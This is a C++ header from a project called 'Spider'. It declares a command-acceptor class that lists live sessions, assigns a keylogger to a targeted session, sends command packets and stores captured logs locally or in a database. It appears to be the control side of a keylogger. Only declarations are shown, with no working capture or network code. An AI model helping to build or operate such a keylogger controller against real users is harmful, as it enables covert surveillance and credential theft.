//
// Created by baptiste on 9/28/17.
//

#ifndef SPIDER_COMMANDACCEPTOR_HPP
# define SPIDER_COMMANDACCEPTOR_HPP

#include "Boost.hpp"
#include <boost/algorithm/string.hpp>
#include <boost/variant/variant.hpp>
#include <boost/variant/apply_visitor.hpp>
#include <future>
#include <unordered_map>
#include <typeindex>
#include "LogSession.hpp"

class CommandAcceptor
{
  public:
    CommandAcceptor(std::vector<boost::shared_ptr<LogSession>> *liveSessions,
    			boost::shared_ptr<DatabaseHandler> &DBUsed) :
      _liveSessions(liveSessions), _DBUsed(DBUsed) {}
    ~CommandAcceptor() = default;

    bool run();

  private:

    bool	assignKeyloggerIfExist();

    void 	clear() const;
    void 	setMap();
    bool 	parser();
    void 	commandSend(const Packet::PacketType pckType) const;
    void 	setStorageType(STORAGE_TYPE method);
    void 	setLocalStorage();
    void 	setDatabaseStorage();
    void 	addDB();
    void 	listDB() const;
    void 	listSessions() const;
    void 	help() const;

    std::string 						_input;
    std::vector<std::string> 					_splitCmd;
    std::unordered_map<std::string, std::function<void()>>	_commandMap;
    boost::shared_ptr<LogSession> 				_targetedSession;
    std::vector<boost::shared_ptr<LogSession>> 			*_liveSessions;
    boost::shared_ptr<DatabaseHandler>				_DBUsed;
};


#endif /* !SPIDER_COMMANDACCEPTOR_HPP */
